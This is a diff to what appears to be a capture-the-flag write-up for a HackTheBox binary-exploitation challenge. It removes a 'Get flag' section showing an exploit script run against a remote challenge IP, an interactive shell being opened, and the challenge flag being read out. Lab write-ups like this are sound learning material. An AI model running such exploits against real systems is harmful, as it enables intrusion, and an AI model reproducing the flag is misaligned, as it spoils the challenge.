@@ -428,27 +428,3 @@ def exploit():
 if __name__ == '__main__':
   exploit()
 ```
-
-# Get flag
-
-```sh
-alter ^ Sol in ~/lab/HTB/chal/pwn/Evil Corp/pwn_evil_corp
-$ ./xpl.py REMOTE 94.237.55.157 30154
-[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
-    Arch:       amd64-64-little
-    RELRO:      Partial RELRO
-    Stack:      Canary found
-    NX:         NX enabled
-    PIE:        PIE enabled
-    SHSTK:      Enabled
-    IBT:        Enabled
-[+] Opening connection to 94.237.55.157 on port 30154: Done
-/home/alter/custom_libs/pwncus/pwncus.py:14: BytesWarning: Text is not bytes; assuming UTF-8, no guarantees. See https://docs.pwntools.com/#bytes
-  sla = lambda msg, data: __main__.p.sendlineafter(msg, data)
-[*] Switching to interactive mode
-
-Thank you!
-谢谢
-$ cat flag.txt
-HTB{45c11_15_N07_4L0000n3}
-```
